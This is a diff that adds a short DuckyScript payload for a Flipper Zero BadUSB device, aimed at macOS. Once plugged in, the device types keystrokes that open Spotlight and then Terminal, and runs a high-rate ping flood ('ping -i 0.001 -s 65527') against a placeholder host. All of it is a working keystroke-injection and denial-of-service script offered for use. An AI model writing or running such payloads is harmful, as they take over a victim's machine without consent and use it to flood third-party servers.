@@ -1,0 +1,12 @@
+REM Author: 47LeCoste
+REM Version 1.0 (Flipper Ducky)
+TARGET: macOS
+DELAY 5000
+GUI SPACE
+DELAY 500
+STRING terminal.app
+DELAY 500
+ENTER
+DELAY 2000
+STRING ping -i 0.001 -s 65527 www.example.com
+ENTER
